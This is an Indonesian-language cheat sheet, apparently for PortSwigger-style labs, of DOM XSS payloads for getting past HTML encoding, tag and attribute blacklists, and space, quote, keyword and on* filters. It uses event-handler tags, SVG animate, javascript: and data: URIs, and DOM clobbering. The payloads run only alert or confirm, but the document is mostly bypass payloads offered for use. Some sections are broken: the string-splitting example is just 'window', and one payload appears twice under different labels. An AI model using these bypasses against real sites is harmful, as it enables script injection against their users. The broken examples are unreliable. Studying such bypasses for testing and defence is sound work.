# 📌 DOM XSS Bypass Filter Cheat Sheet (Advanced)

---

## 🧠 1. HTML Entity Encoding Bypass

```id="b1q9kx"
&lt;img src=x onerror=alert(1)&gt;
```

### 🔍 Masalah

* `<` `>` di-encode jadi `&lt; &gt;`
* Tidak diparse sebagai HTML

### 💡 Bypass

* Cari sink lain (innerHTML decode dulu)
* Gunakan double decoding bug
* Gunakan context lain (attribute / URL)

---

## 🧠 2. Tag Blacklist Bypass

Jika `<script>` diblok:

### 💡 Alternatif event-based payload:

```id="c8v2lz"
<img src=1 onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
```

---

## 🧠 3. Attribute Blacklist Bypass (onerror/onload diblok)

Gunakan event lain:

```id="x7m3qp"
onclick
onmouseover
onfocus
onmouseenter
```

Contoh:

```html id="n2k9vd"
<img src=x onmouseover=alert(1)>
```

---

## 🧠 4. Keyword Filter Bypass (alert / script)

### 💡 String splitting:

```id="d4z8lw"
window
```

### 💡 Alternative function:

```id="h9p2cn"
confirm(1)
prompt(1)
```

---

## 🧠 5. Space Filtering Bypass

Kalau spasi diblok:

```id="k5t8xq"
<img/src=x/onerror=alert(1)>
```

Atau pakai tab/newline:

```id="p1v7md"
<img	
src=x	
onerror=alert(1)>
```

---

## 🧠 6. Quotes Blocking Bypass

Jika `"` atau `'` diblok:

```id="q8n3xz"
<img src=x onerror=alert(1)>
```

atau exploit tanpa quotes:

```id="r3m9kp"
<img src=x onerror=alert(1)>
```

---

## 🧠 7. innerHTML Sanitizer Bypass

Jika filter hapus `<script>`:

### 💡 Gunakan DOM-based HTML execution:

```id="t6w2sn"
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
```

---

## 🧠 8. Event Handler Stripping Bypass

Kalau `on*` dihapus:

### 💡 Use alternative vector:

```id="y2k7fd"
<iframe src="javascript:alert(1)">
```

```id="m8v4rq"
<object data="javascript:alert(1)">
```

---

## 🧠 9. URL Context Bypass

Kalau sink = `href/src`:

```id="z1c5wt"
javascript:alert(1)
```

```id="v6n2pq"
data:text/html,<script>alert(1)</script>
```

---

## 🧠 10. DOM Clobbering (Advanced Lab Trick)

```id="f9x2lk"
<form id=alert><input name=1>
```

Trigger JS:

* `alert` jadi DOM object
* bisa override reference di JS

---

# 📌 QUICK MIND MAP

```id="u8k3md"
FILTER TYPE → BYPASS STRATEGY
────────────────────────────
HTML encode → decode chain / context switch
Tag blocked  → SVG / IMG / BODY
Event blocked → alternate event
Quotes blocked → no-quote payload
Script blocked → event handlers / JS URI
```

---

# 📌 REAL LAB RULE (PortSwigger mindset)

> Tidak ada filter yang benar-benar “menghapus XSS”, hanya menggeser konteks.

---

# 📌 FAST DECISION RULE

```id="s3p8xq"
IF input masuk ke:
- innerHTML
- document.write
- eval

AND ada filter ringan
→ THINK: alternative HTML + event-based XSS
```

